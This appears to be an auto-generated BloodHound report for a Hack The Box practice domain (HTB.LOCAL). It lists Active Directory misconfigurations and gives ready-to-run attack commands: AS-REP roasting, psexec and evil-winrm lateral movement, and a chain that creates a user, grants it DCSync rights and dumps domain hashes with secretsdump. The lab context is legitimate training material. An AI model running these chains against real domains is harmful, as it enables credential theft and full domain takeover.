# BloodHound Enhanced Report

**Generated:** 2026-01-15 08:46:26

---

## Data Inventory

**Domains:** HTB.LOCAL

| Type | Count | Details |
|------|-------|---------|
| Users | 32 | 18 enabled |
| Computers | 2 | EXCH01.HTB.LOCAL, FOREST.HTB.LOCAL |
| Groups | 76 | ACCOUNT OPERATORS@HTB.LOCAL, ADMINISTRATORS@HTB.LOCAL, BACKUP OPERATORS@HTB.LOCAL |

**Relationships:** GenericAll: 299 | WriteDacl: 228 | MemberOf: 37 | DCSync: 4 | AdminTo: 3 | CanPSRemote: 1

## Attack Commands

## Attack Commands

### Quick Wins

### impacket-GetNPUsers - AS-REP Roasting Attack 

**Objective:** Extract AS-REP hashes from users with 'Do not require Kerberos preauthentication' enabled (AS-REP Roasting).
Targets misconfigured accounts to obtain crackable password hashes without authentication.
**Rewards:** AS-REP roast - no auth required
**Template:** `impacket-GetNPUsers -dc-ip <DC_IP> -request -outputfile <OUTPUT_FILE> <DOMAIN>/<USERNAME>`
**Example:** `impacket-GetNPUsers -dc-ip 10.10.10.70 -request -outputfile hashes.asreproast corp.com/testuser`
**Requires:** None (pre-auth disabled on target)

| Discovered | Domain | Warnings | Info | Ready Command |
|------|--------|----------|--------|---------------|
| SVC-ALFRESCO@HTB.LOCAL | HTB.LOCAL |  | AS-REP roast - no auth required | `impacket-GetNPUsers -dc-ip DC01.HTB.LOCAL -request -outputfile <OUTPUT_FILE> htb.local/SVC-ALFRESCO` |

### Rubeus - Monitor for TGTs (Unconstrained Delegation) 

**Objective:** Monitor for incoming TGTs on unconstrained delegation host
**Rewards:** Unconstrained delegation - monitor for TGT capture
**Template:** `Rubeus.exe monitor /interval:5 /nowrap /targetuser:<TARGET_USER>`
**Example:** `Rubeus.exe monitor /interval:5 /nowrap /targetuser:DC01$`
**Need:** <TARGET_USER>
**Requires:** Local admin on unconstrained delegation host

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
|  | FOREST.HTB.LOCAL |  | Unconstrained delegation - monitor for TGT capture | `Rubeus.exe monitor /interval:5 /nowrap /targetuser:<TARGET_USER>` |

### Lateral Movement

### Impacket PSExec - Remote Command Execution [AdminTo]

**Objective:** Execute commands on remote Windows system via SMB + MSRPC. Creates Windows service, provides interactive shell. Most versatile Impacket execution tool.
**Rewards:** SYSTEM shell for credential dumping, persistence, and pivoting
**Template:** `impacket-psexec '<DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>'`
**Example:** `impacket-psexec 'corp.com/administrator:P@ssw0rd!@10.10.10.75'`
**Need:** <PASSWORD>
**Requires:** Local admin on target (AdminTo edge)

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| ADMINISTRATOR@HTB.LOCAL | FOREST.HTB.LOCAL |  | ADMINISTRATOR has local admin rights on FOREST | `impacket-psexec 'htb.local/ADMINISTRATOR:<PASSWORD>@FOREST.HTB.LOCAL'` |

### Evil-WinRM - PowerShell Remoting [CanPSRemote]

**Objective:** Connect to Windows via WinRM for PowerShell access
**Rewards:** PowerShell remoting for stealthy command execution
**Template:** `evil-winrm -i <TARGET> -u <USER> -p <PASSWORD>`
**Example:** `evil-winrm -i 192.168.1.10 -u administrator -p Password123`
**Need:** <PASSWORD>
**Requires:** Remote Management Users or Administrators group

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| PRIVILEGED IT ACCOUNTS@HTB.LOCAL | FOREST.HTB.LOCAL |  | PRIVILEGED IT ACCOUNTS has PSRemote/WinRM access to FOREST | `evil-winrm -i FOREST.HTB.LOCAL -u PRIVILEGED IT ACCOUNTS -p <PASSWORD>` |

### Multi-Step Attack Chains

#### [DETECTED] Exchange WriteDACL → DCSync
*Exploit Exchange Windows Permissions WriteDACL on domain to grant DCSync rights and dump all domain hashes.*

1. **Account Operators can create users and add them to non-protected groups. We need a clean user to gra**
   - Template: `net user {new_user} '{new_pass}' /add /domain`
   - Ready: `net user bloodtrail 'B1oodTr@il123!' /add /domain`
2. **Exchange Windows Permissions has WriteDACL on the domain object. Adding our user gives us the abilit**
   - Template: `net group "Exchange Windows Permissions" {new_user} /add`
   - Ready: `net group "Exchange Windows Permissions" bloodtrail /add`
3. **This step is optional but allows testing with a fresh session. The new user will have WinRM access i**
   - Template: `net localgroup "Remote Management Users" {new_user} /add`
   - Ready: `net localgroup "Remote Management Users" bloodtrail /add`
4. **WriteDACL allows modifying the domain's Discretionary Access Control List. We add DS-Replication-Get**
   - Template: `. .\PowerView.ps1
$pass = ConvertTo-SecureString '{new_pass}' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('{domain}\{new_user}', $pass)
Add-ObjectACL -PrincipalIdentity {new_user} -Credential $cred -Rights DCSync`
   - Ready: `. .\PowerView.ps1
$pass = ConvertTo-SecureString 'B1oodTr@il123!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('HTB.LOCAL\bloodtrail', $pass)
Add-ObjectACL -PrincipalIdentity bloodtrail -Credential $cred -Rights DCSync`
5. **DCSync mimics a Domain Controller requesting replication data. With DCSync rights, we can extract pa**
   - Template: `impacket-secretsdump {domain}/{new_user}:'{new_pass}'@{target}`
   - Ready: `impacket-secretsdump HTB.LOCAL/bloodtrail:'B1oodTr@il123!'@<DC_IP>`
6. **With the Administrator NTLM hash, we can authenticate without knowing the password. psexec creates a**
   - Template: `impacket-psexec {domain}/Administrator@{target} -hashes {admin_hash}`
   - Ready: `impacket-psexec {domain}/Administrator@{target} -hashes {admin_hash}`

#### [DETECTED] GenericAll → Password Reset → Lateral Movement
*Use GenericAll rights on a user to reset their password and gain access to their resources.*

1. **GenericAll includes the right to reset passwords. The target won't be notified and their current pas**
   - Template: `net user {target_user} '{new_pass}' /domain`
   - Ready: `net user {target_user} '{new_pass}' /domain`
2. **Always verify credential changes before proceeding.**
   - Template: `crackmapexec smb {target} -u '{target_user}' -p '{new_pass}' -d {domain}`
   - Ready: `crackmapexec smb {target} -u '{target_user}' -p '{new_pass}' -d {domain}`

---

## Quick Wins

### [OK] AS-REP Roastable Users
**OSCP Relevance:** MEDIUM | **Results:** 1

> Find users with Kerberos pre-authentication disabled (dontreqpreauth=true). These can be AS-REP roasted without authentication using GetNPUsers.py.

| User | IsPrivileged | Description |
| --- | --- | --- |
| SVC-ALFRESCO@HTB.LOCAL | True |  |

### [-] Kerberoastable Service Accounts
**OSCP Relevance:** MEDIUM | **Results:** None

### [-] High-Value Kerberoastable (Privileged + SPN)
**OSCP Relevance:** MEDIUM | **Results:** None

### [OK] Unconstrained Delegation Systems
**OSCP Relevance:** MEDIUM | **Results:** 1

> Find computers with unconstrained delegation enabled. These can be abused to capture TGTs from authenticating users (printer bug, coercion attacks).

| Computer | ComputerIP | OS | Description |
| --- | --- | --- | --- |
| FOREST.HTB.LOCAL |  | Windows Server 2016 Standard |  |

### [-] Constrained Delegation Principals
**OSCP Relevance:** MEDIUM | **Results:** None

### [-] Users with Passwords in Description
**OSCP Relevance:** MEDIUM | **Results:** None

### [OK] Accounts with Password Never Expires
**OSCP Relevance:** MEDIUM | **Results:** 17

> Find accounts with non-expiring passwords. Often service accounts with weak passwords or credentials in documentation.

| User | IsPrivileged | Description |
| --- | --- | --- |
| SVC-ALFRESCO@HTB.LOCAL | True |  |
| SANTI@HTB.LOCAL | False |  |
| ANDY@HTB.LOCAL | False |  |
| MARK@HTB.LOCAL | False |  |
| LUCINDA@HTB.LOCAL | False |  |
| SEBASTIEN@HTB.LOCAL | False |  |
| HEALTHMAILBOX0659CC1@HTB.LOCAL | False |  |
| HEALTHMAILBOXB01AC64@HTB.LOCAL | False |  |
| HEALTHMAILBOX7108A4E@HTB.LOCAL | False |  |
| HEALTHMAILBOXFD87238@HTB.LOCAL | False |  |
| HEALTHMAILBOX83D6781@HTB.LOCAL | False |  |
| HEALTHMAILBOX6DED678@HTB.LOCAL | False |  |
| HEALTHMAILBOX968E74D@HTB.LOCAL | False |  |
| HEALTHMAILBOX670628E@HTB.LOCAL | False |  |
| HEALTHMAILBOXFC9DAAD@HTB.LOCAL | False |  |
| HEALTHMAILBOXC0A90C9@HTB.LOCAL | False |  |
| HEALTHMAILBOXC3D7722@HTB.LOCAL | False |  |

### [OK] Accounts That Never Logged In
**OSCP Relevance:** MEDIUM | **Results:** 13

> Find accounts that have never logged in. May have default or documented passwords.

| User | Description | Created |
| --- | --- | --- |
| SANTI@HTB.LOCAL |  |  |
| ANDY@HTB.LOCAL |  |  |
| MARK@HTB.LOCAL |  |  |
| LUCINDA@HTB.LOCAL |  |  |
| HEALTHMAILBOX0659CC1@HTB.LOCAL |  |  |
| HEALTHMAILBOXB01AC64@HTB.LOCAL |  |  |
| HEALTHMAILBOX7108A4E@HTB.LOCAL |  |  |
| HEALTHMAILBOXFD87238@HTB.LOCAL |  |  |
| HEALTHMAILBOX83D6781@HTB.LOCAL |  |  |
| HEALTHMAILBOX6DED678@HTB.LOCAL |  |  |
| HEALTHMAILBOX968E74D@HTB.LOCAL |  |  |
| HEALTHMAILBOX670628E@HTB.LOCAL |  |  |
| HEALTHMAILBOXC0A90C9@HTB.LOCAL |  |  |

### [OK] Computers Without LAPS
**OSCP Relevance:** MEDIUM | **Results:** 2

> Find computers that don't have LAPS deployed. Local admin passwords may be reused or weak.

| Computer | ComputerIP | OS |
| --- | --- | --- |
| EXCH01.HTB.LOCAL |  | Windows Server 2016 Standard |
| FOREST.HTB.LOCAL |  | Windows Server 2016 Standard |

### [OK] Pre-Windows 2000 Compatible Access Accounts
**OSCP Relevance:** MEDIUM | **Results:** 1

> Find computers in Pre-Windows 2000 Compatible Access group. Legacy compatibility may expose vulnerabilities.

| Member | Type | ViaGroup |
| --- | --- | --- |
| EVERYONE@HTB.LOCAL | ['Group'] | PRE-WINDOWS 2000 COMPATIBLE ACCESS@HTB.LOCAL |

### [-] ReadGMSAPassword Rights
**OSCP Relevance:** MEDIUM | **Results:** None

### [-] ReadLAPSPassword Rights
**OSCP Relevance:** MEDIUM | **Results:** None

### [-] All gMSA Accounts
**OSCP Relevance:** MEDIUM | **Results:** None

---

## Lateral Movement

### [-] Non-DA Users with Local Admin on Workstations
**OSCP Relevance:** MEDIUM | **Results:** None

### [OK] All Local Admins per Computer
**OSCP Relevance:** MEDIUM | **Results:** 1

> Enumerate all principals (users, groups) with local admin rights on each computer. Useful for identifying high-value targets with many admin paths.

| Computer | ComputerIP | LocalAdmins | AdminCount |
| --- | --- | --- | --- |
| FOREST.HTB.LOCAL |  | ['ADMINISTRATOR@HTB.LOCAL', 'ENTERPRISE ADMINS@HTB.LOCAL', 'DOMAIN ADMINS@HTB.LOCAL'] | 3 |

### [OK] PSRemote Access (Evil-WinRM Targets)
**OSCP Relevance:** MEDIUM | **Results:** 1

> Find users with PowerShell Remoting access to computers. These are Evil-WinRM targets for lateral movement.

| User | PSRemoteTargets | PSRemoteIPs | TargetCount |
| --- | --- | --- | --- |
| PRIVILEGED IT ACCOUNTS@HTB.LOCAL | ['FOREST.HTB.LOCAL'] | [] | 1 |

### [-] RDP Access Targets
**OSCP Relevance:** MEDIUM | **Results:** None

### [-] DCOM Execution Rights
**OSCP Relevance:** MEDIUM | **Results:** None

### Sessions on Specific Computer
*Skipped - requires variables: COMPUTER*

### All Computer Access for Specific User
*Skipped - requires variables: USER*

### All Users Who Can Access Specific Computer
*Skipped - requires variables: COMPUTER*

### [-] Computers Where Domain Users Are Local Admin
**OSCP Relevance:** MEDIUM | **Results:** None

### [OK] Computers with Multiple Admin Paths
**OSCP Relevance:** MEDIUM | **Results:** 1

> Find computers accessible via multiple different users. These are high-value targets with more exploitation options.

| Computer | ComputerIP | NumberOfAdminPaths | Admins |
| --- | --- | --- | --- |
| FOREST.HTB.LOCAL |  | 3 | ['ADMINISTRATOR@HTB.LOCAL', 'ENTERPRISE ADMINS@HTB.LOCAL', 'DOMAIN ADMINS@HTB.LOCAL'] |

### [-] Workstations with Domain Admin Sessions
**OSCP Relevance:** MEDIUM | **Results:** None

### [-] Cross-Trust Lateral Movement
**OSCP Relevance:** MEDIUM | **Results:** None

### [-] Coercion Targets (Unconstrained Delegation)
**OSCP Relevance:** MEDIUM | **Results:** None

### [-] SID History Abuse Paths
**OSCP Relevance:** MEDIUM | **Results:** None

### [-] Domain Trust Relationships
**OSCP Relevance:** MEDIUM | **Results:** None

---

## Privilege Escalation

### [OK] DCSync Rights
**OSCP Relevance:** MEDIUM | **Results:** 5

> Find principals with DCSync rights (GetChanges + GetChangesAll on Domain). Can perform secretsdump.py to extract all domain hashes.

| Principal | Type | Right |
| --- | --- | --- |
| DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] | GetChangesAll |
| ADMINISTRATORS@HTB.LOCAL | ['Group'] | GetChangesAll |
| ENTERPRISE DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] | GetChanges |
| ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] | GetChanges |
| ADMINISTRATORS@HTB.LOCAL | ['Group'] | GetChanges |

### [OK] GenericAll on High-Value Targets
**OSCP Relevance:** MEDIUM | **Results:** 37

> Find principals with GenericAll (full control) over privileged users, groups, or computers. Can reset passwords, modify group memberships, etc.

| Attacker | Victim | VictimType |
| --- | --- | --- |
| DOMAIN ADMINS@HTB.LOCAL | SERVICE ACCOUNTS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | SERVICE ACCOUNTS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | SECURITY ADMINISTRATOR@HTB.LOCAL | ['Group'] |
| ORGANIZATION MANAGEMENT@HTB.LOCAL | SECURITY ADMINISTRATOR@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | SECURITY ADMINISTRATOR@HTB.LOCAL | ['Group'] |
| ACCOUNT OPERATORS@HTB.LOCAL | SECURITY ADMINISTRATOR@HTB.LOCAL | ['Group'] |
| ACCOUNT OPERATORS@HTB.LOCAL | DNSADMINS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | DNSADMINS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | DNSADMINS@HTB.LOCAL | ['Group'] |
| ACCOUNT OPERATORS@HTB.LOCAL | KEY ADMINS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | KEY ADMINS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | KEY ADMINS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] |
| ACCOUNT OPERATORS@HTB.LOCAL | ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| ACCOUNT OPERATORS@HTB.LOCAL | ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | CLONEABLE DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | CLONEABLE DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| ACCOUNT OPERATORS@HTB.LOCAL | CLONEABLE DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| ACCOUNT OPERATORS@HTB.LOCAL | DOMAIN GUESTS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | DOMAIN GUESTS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | DOMAIN GUESTS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | DOMAIN USERS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | DOMAIN USERS@HTB.LOCAL | ['Group'] |
| ACCOUNT OPERATORS@HTB.LOCAL | DOMAIN USERS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | DOMAIN COMPUTERS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | DOMAIN COMPUTERS@HTB.LOCAL | ['Group'] |
| ACCOUNT OPERATORS@HTB.LOCAL | DOMAIN COMPUTERS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | STORAGE REPLICA ADMINISTRATORS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | STORAGE REPLICA ADMINISTRATORS@HTB.LOCAL | ['Group'] |
| ACCOUNT OPERATORS@HTB.LOCAL | STORAGE REPLICA ADMINISTRATORS@HTB.LOCAL | ['Group'] |
| ACCOUNT OPERATORS@HTB.LOCAL | HYPER-V ADMINISTRATORS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | HYPER-V ADMINISTRATORS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | HYPER-V ADMINISTRATORS@HTB.LOCAL | ['Group'] |

### [-] Shadow Admins (Control over DA Users)
**OSCP Relevance:** MEDIUM | **Results:** None

### [OK] WriteDacl Abuse Paths
**OSCP Relevance:** MEDIUM | **Results:** 70

> Find principals with WriteDacl on high-value targets. Can grant themselves GenericAll then escalate further.

| Attacker | Victim | VictimType |
| --- | --- | --- |
| ADMINISTRATORS@HTB.LOCAL | SVC-ALFRESCO@HTB.LOCAL | ['User'] |
| ENTERPRISE ADMINS@HTB.LOCAL | SVC-ALFRESCO@HTB.LOCAL | ['User'] |
| DOMAIN ADMINS@HTB.LOCAL | SVC-ALFRESCO@HTB.LOCAL | ['User'] |
| DOMAIN ADMINS@HTB.LOCAL | KRBTGT@HTB.LOCAL | ['User'] |
| ADMINISTRATORS@HTB.LOCAL | KRBTGT@HTB.LOCAL | ['User'] |
| ENTERPRISE ADMINS@HTB.LOCAL | KRBTGT@HTB.LOCAL | ['User'] |
| ADMINISTRATORS@HTB.LOCAL | ADMINISTRATOR@HTB.LOCAL | ['User'] |
| DOMAIN ADMINS@HTB.LOCAL | ADMINISTRATOR@HTB.LOCAL | ['User'] |
| ENTERPRISE ADMINS@HTB.LOCAL | ADMINISTRATOR@HTB.LOCAL | ['User'] |
| ADMINISTRATORS@HTB.LOCAL | PRIVILEGED IT ACCOUNTS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | PRIVILEGED IT ACCOUNTS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | PRIVILEGED IT ACCOUNTS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | SERVICE ACCOUNTS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | SERVICE ACCOUNTS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | SERVICE ACCOUNTS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | SECURITY ADMINISTRATOR@HTB.LOCAL | ['Group'] |
| EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL | SECURITY ADMINISTRATOR@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | DNSADMINS@HTB.LOCAL | ['Group'] |
| EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL | DNSADMINS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | KEY ADMINS@HTB.LOCAL | ['Group'] |
| EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL | KEY ADMINS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] |
| EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL | ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] |
| EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL | ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | READ-ONLY DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | READ-ONLY DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | READ-ONLY DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | CLONEABLE DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL | CLONEABLE DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | ACCOUNT OPERATORS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | ACCOUNT OPERATORS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | ACCOUNT OPERATORS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | SERVER OPERATORS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | SERVER OPERATORS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | SERVER OPERATORS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | DOMAIN GUESTS@HTB.LOCAL | ['Group'] |
| EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL | DOMAIN GUESTS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | DOMAIN USERS@HTB.LOCAL | ['Group'] |
| EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL | DOMAIN USERS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | DOMAIN ADMINS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | DOMAIN ADMINS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | DOMAIN ADMINS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | ENTERPRISE ADMINS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | ENTERPRISE ADMINS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | ENTERPRISE ADMINS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | SCHEMA ADMINS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | SCHEMA ADMINS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | SCHEMA ADMINS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | DOMAIN COMPUTERS@HTB.LOCAL | ['Group'] |
| EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL | DOMAIN COMPUTERS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | STORAGE REPLICA ADMINISTRATORS@HTB.LOCAL | ['Group'] |
| EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL | STORAGE REPLICA ADMINISTRATORS@HTB.LOCAL | ['Group'] |
| EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL | HYPER-V ADMINISTRATORS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | HYPER-V ADMINISTRATORS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | REPLICATOR@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | REPLICATOR@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | REPLICATOR@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | BACKUP OPERATORS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | BACKUP OPERATORS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | BACKUP OPERATORS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | PRINT OPERATORS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | PRINT OPERATORS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | PRINT OPERATORS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | ADMINISTRATORS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | ADMINISTRATORS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | ADMINISTRATORS@HTB.LOCAL | ['Group'] |

### [OK] WriteOwner Abuse Paths
**OSCP Relevance:** MEDIUM | **Results:** 59

> Find principals with WriteOwner on targets. Can take ownership, then WriteDacl, then GenericAll.

| Attacker | Victim | VictimType |
| --- | --- | --- |
| DOMAIN ADMINS@HTB.LOCAL | SVC-ALFRESCO@HTB.LOCAL | ['User'] |
| ENTERPRISE ADMINS@HTB.LOCAL | SVC-ALFRESCO@HTB.LOCAL | ['User'] |
| ADMINISTRATORS@HTB.LOCAL | SVC-ALFRESCO@HTB.LOCAL | ['User'] |
| ENTERPRISE ADMINS@HTB.LOCAL | KRBTGT@HTB.LOCAL | ['User'] |
| ADMINISTRATORS@HTB.LOCAL | KRBTGT@HTB.LOCAL | ['User'] |
| DOMAIN ADMINS@HTB.LOCAL | KRBTGT@HTB.LOCAL | ['User'] |
| ENTERPRISE ADMINS@HTB.LOCAL | ADMINISTRATOR@HTB.LOCAL | ['User'] |
| ADMINISTRATORS@HTB.LOCAL | ADMINISTRATOR@HTB.LOCAL | ['User'] |
| DOMAIN ADMINS@HTB.LOCAL | ADMINISTRATOR@HTB.LOCAL | ['User'] |
| DOMAIN ADMINS@HTB.LOCAL | PRIVILEGED IT ACCOUNTS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | PRIVILEGED IT ACCOUNTS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | PRIVILEGED IT ACCOUNTS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | SERVICE ACCOUNTS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | SERVICE ACCOUNTS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | SERVICE ACCOUNTS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | SECURITY ADMINISTRATOR@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | DNSADMINS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | KEY ADMINS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | READ-ONLY DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | READ-ONLY DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | READ-ONLY DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | CLONEABLE DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | ACCOUNT OPERATORS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | ACCOUNT OPERATORS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | ACCOUNT OPERATORS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | SERVER OPERATORS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | SERVER OPERATORS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | SERVER OPERATORS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | DOMAIN GUESTS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | DOMAIN USERS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | DOMAIN ADMINS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | DOMAIN ADMINS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | DOMAIN ADMINS@HTB.LOCAL | ['Group'] |
